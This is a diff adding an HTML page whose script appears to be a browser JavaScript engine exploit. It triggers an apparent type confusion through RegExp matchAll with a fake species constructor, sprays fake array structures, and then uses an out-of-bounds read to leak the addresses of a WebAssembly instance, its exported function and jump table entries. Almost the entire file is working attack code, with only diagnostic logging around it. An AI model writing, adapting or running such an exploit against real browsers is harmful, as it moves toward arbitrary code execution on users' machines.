@@ -1,0 +1,75 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P61</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11]);
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  function hr(a){const o=a-0x1080018;if(o<0||o>0x3FFFFFFE0)return 0n;try{return f2i(m[Math.floor(o/8)]);}catch(e){return 0n;}}
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  let OB=-1;
+  for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;const wA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("W:"+wA.toString(16));
+    // Read WasmExportFn
+    objB[4]=wasmI.exports.f;const fA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("F:"+fA.toString(16));
+    const fR=fA&0xFFFFFFFE;
+    // Read JSFunction fields to get dispatch_handle
+    const fq2=hr(fR+16); // QWORD 2: lo=dispatch_handle
+    const dh=Number(fq2&0xffffffffn);
+    log("DH:"+dh.toString(16));
+    // Try reading JDT at cage+dh (if dh is cage-relative)
+    if(dh>0x1000&&dh<0x20000000){
+      const jdt=[];
+      for(let i=0;i<4;i++){const v=hr(dh+i*8);jdt.push(v.toString(16));}
+      log("JDT:"+jdt.join(","));
+    }
+    // Also try at cage+dh*16 (if dh is an entry index, not byte offset)
+    const dh16=dh*16;
+    if(dh16>0x1000&&dh16<0x20000000){
+      const jdt2=[];
+      for(let i=0;i<2;i++){const v=hr(dh16+i*8);jdt2.push(v.toString(16));}
+      log("JDT16:"+jdt2.join(","));
+    }
+  }else{log("STALE");}
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
